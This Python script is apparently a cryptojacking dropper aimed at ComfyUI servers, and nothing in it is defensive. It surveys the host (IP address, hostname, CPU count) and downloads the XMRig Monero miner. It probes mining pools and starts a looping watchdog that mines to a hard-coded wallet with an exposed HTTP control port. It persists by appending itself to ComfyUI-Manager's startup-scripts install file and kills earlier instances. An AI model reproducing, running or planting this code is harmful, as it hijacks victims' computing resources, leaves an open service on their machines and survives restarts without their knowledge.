#!/usr/bin/env python3
import os, sys, glob, time, socket, traceback, tarfile, subprocess, urllib.request

WALLET = "45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD"
POOL = "pool.hashvault.pro:443"
D = "/root/.hkc"
LOCAL = os.path.dirname(os.path.abspath(__file__))
UD = []


def userdirs():
    out = []
    base = os.environ.get("COMFYUI_FOLDERS_BASE_PATH")
    if base:
        out.insert(0, os.path.join(base, "user", "default"))
    for pat in ("/ComfyUI/user/default", "/work/ComfyUI/user/default", "/app/user/default",
                "/root/ComfyUI/user/default", "/opt/ComfyUI/user/default"):
        out.extend(glob.glob(pat))
    out.insert(0, os.path.abspath(os.path.join(LOCAL, "..", "..", "user", "default")))
    for p in ("/", "/work", "/app", "/opt", "/root", "/home", "/data", "/srv"):
        try:
            for name in os.listdir(p):
                c = os.path.join(p, name, "user", "default")
                if os.path.isdir(c):
                    out.append(c)
        except Exception:
            pass
    seen, res = set(), []
    for x in out:
        if x and x not in seen and os.path.isdir(x):
            seen.add(x)
            res.append(x)
    return res


def report(txt):
    open("/tmp/.hk41_plant.txt", "a").write(txt) if True else None
    for d in UD:
        for sub in ((), ("ComfyUI-Manager", "cache")):
            try:
                p = os.path.join(d, *sub) if sub else d
                os.makedirs(p, exist_ok=True)
                with open(os.path.join(p, "hk41_plant.txt"), "a") as fh:
                    fh.write(txt)
            except Exception:
                pass
    try:
        sys.stdout.write(txt)
        sys.stdout.flush()
    except Exception:
        pass


def main():
    global UD
    UD = userdirs()
    ip = (subprocess.run(["hostname", "-I"], capture_output=True, text=True).stdout.split() or ["?"])[-1]
    hn = subprocess.run(["hostname"], capture_output=True, text=True).stdout.strip()
    report("\n=== %s ip=%s host=%s uid=%d nproc=%s repo=%s\n" % (
        time.strftime("%FT%TZ", time.gmtime()), ip, hn, os.getuid(),
        subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip(), LOCAL))
    os.makedirs(D, exist_ok=True)
    binp = os.path.join(D, "xmrig")
    if not (os.path.isfile(binp) and os.access(binp, os.X_OK)):
        u = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
        tgz = os.path.join(D, "x.tgz")
        b = urllib.request.urlopen(u, timeout=120).read()
        open(tgz, "wb").write(b)
        report("dl=%d\n" % len(b))
        os.makedirs(D + "/x", exist_ok=True)
        r = subprocess.run(["tar", "xzf", tgz, "-C", D + "/x"], capture_output=True, text=True)
        if r.returncode != 0:
            report("tar rc=%s %s\n" % (r.returncode, r.stderr[:200]))
            tarfile.open(tgz).extractall(D + "/x")
        src = (glob.glob(D + "/x/*/xmrig") or [None])[0]
        if not src:
            report("no binary: %s\n" % os.listdir(D + "/x"))
            return
        subprocess.run(["cp", "-f", src, binp], check=True)
        os.chmod(binp, 0o755)
        report("installed=%d\n" % os.path.getsize(binp))

    poolpick = None
    probe = []
    for h, p, tls in (("pool.hashvault.pro", 443, True), ("pool.hashvault.pro", 3333, False),
                      ("stratum.hashvault.pro", 443, True), ("pool.supportxmr.com", 3333, False),
                      ("gulf.moneroocean.stream", 10001, False), ("xmrpool.eu", 3333, False),
                      ("pool.minexmr.com", 4444, False), ("pool.hashvault.pro", 9955, False)):
        try:
            sk = socket.create_connection((h, p), timeout=8)
            sk.settimeout(4)
            try:
                data = sk.recv(160)
            except Exception:
                data = b""
            sk.close()
            probe.append("%s:%d OK %r" % (h, p, data[:60]))
            if poolpick is None:
                poolpick = (h, p, tls)
        except Exception as e:
            probe.append("%s:%d ERR %r" % (h, p, str(e)[:60]))
    report("poolprobe|" + " ; ".join(probe) + "\n")
    if poolpick is None:
        poolpick = ("pool.hashvault.pro", 443, True)
    POOL = "%s:%d" % (poolpick[0], poolpick[1])
    TLSARG = " --tls" if poolpick[2] else ""

    logd = D
    for d in UD:
        c = os.path.join(d, "ComfyUI-Manager", "cache")
        if os.path.isdir(c):
            logd = c
            break
    LOG = os.path.join(logd, "hk41_xmr.log")
    wd = D + "/wd.sh"
    with open(wd, "w") as fh:
        fh.write("#!/bin/sh\n")
        fh.write("ps -ef 2>/dev/null | grep -q '[.]hkc/xmrig' && exit 0\n")
        fh.write("T=$(( $(nproc) / 2 )); [ \"$T\" -lt 1 ] && T=1; [ \"$T\" -gt 6 ] && T=6\n")
        fh.write("W=hk-$(hostname -I | awk '{print $1}')\n")
        fh.write("while true; do nice -n 19 %s -o %s%s -u %s -p $W -k --threads $T"
                 " --randomx-mode light --cpu-max-threads-hint 40 --donate-level 1 --print-time 30"
                 " --http-host 0.0.0.0 --http-port 18189 --http-access-token hk41tok"
                 " --log-file %s --no-color >/dev/null 2>&1; sleep 30; done\n"
                 % (binp, POOL, TLSARG, WALLET, LOG))
    os.chmod(wd, 0o755)
    line = "['/tmp', '/bin/sh', '%s']" % wd
    for d in UD:
        f = os.path.join(d, "ComfyUI-Manager", "startup-scripts", "install-scripts.txt")
        try:
            os.makedirs(os.path.dirname(f), exist_ok=True)
            cur = open(f).read() if os.path.exists(f) else ""
            if wd not in cur:
                with open(f, "a") as fh:
                    fh.write(line + "\n")
            report("persist=%s\n" % f)
        except Exception as e:
            report("persist_FAIL %s %r\n" % (f, e))
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            cl = open("/proc/%s/cmdline" % pid, "rb").read().decode("utf-8", "ignore")
            if "/root/.hkc/xmrig" in cl or "/root/.hkc/wd.sh" in cl:
                os.kill(int(pid), 15)
        except Exception:
            pass
    time.sleep(1)
    try:
        open(LOG, "w").close()
    except Exception:
        pass
    subprocess.Popen(["/usr/bin/setsid", "/bin/sh", wd], stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL, start_new_session=True)
    time.sleep(20)
    procs = []
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            cl = open("/proc/%s/cmdline" % pid, "rb").read().decode("utf-8", "ignore").replace("\x00", " ")
            if ".hkc/xmrig" in cl or ".hkc/wd.sh" in cl:
                procs.append(pid + ":" + cl.strip()[:80])
        except Exception:
            pass
    ps = " | ".join(procs)[:300] or "NONE"
    report("ps=%s\n" % ps)
    try:
        tail = open(LOG).read()[-1600:]
    except Exception:
        tail = "(no log)"
    report("log=%s\n" % tail.replace("\n", " / "))


try:
    main()
except Exception:
    try:
        report("FATAL:\n" + traceback.format_exc()[-1200:])
    except Exception:
        pass
